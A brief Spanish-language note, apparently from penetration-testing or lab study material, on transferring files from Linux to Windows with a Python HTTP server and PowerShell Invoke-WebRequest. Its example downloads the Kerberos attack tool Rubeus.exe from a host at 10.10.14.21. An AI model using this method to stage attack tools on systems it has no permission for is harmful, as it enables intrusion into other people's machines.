# Transferencia de Archivos: Linux a Windows

Esta entrada describe técnicas generales para transferir archivos desde un sistema Linux a uno Windows. Una de las técnicas más sencillas utiliza un servidor HTTP en Linux y la herramienta de PowerShell **Invoke-WebRequest (iwr)** en Windows para descargar los archivos.

## Técnica: IWR (Invoke-WebRequest)

### 1. Levantar un Servidor HTTP en Linux

En la máquina Linux, se puede iniciar un servidor HTTP simple usando Python para que el contenido del directorio actual sea accesible:

```bash
python3 -m http.server 80
```

### 2. Descargar el Archivo en Windows

En la máquina Windows, se utiliza PowerShell para descargar el archivo desde el servidor Linux. Por ejemplo, para descargar un archivo llamado **Rubeus.exe**:

```powershell
iwr -uri http://10.10.14.21/Rubeus.exe -OutFile Rubeus.exe
```

- **-uri**: Especifica la URL del archivo en el servidor Linux.
- **-OutFile**: Define el nombre y ubicación donde se guardará el archivo descargado en Windows.
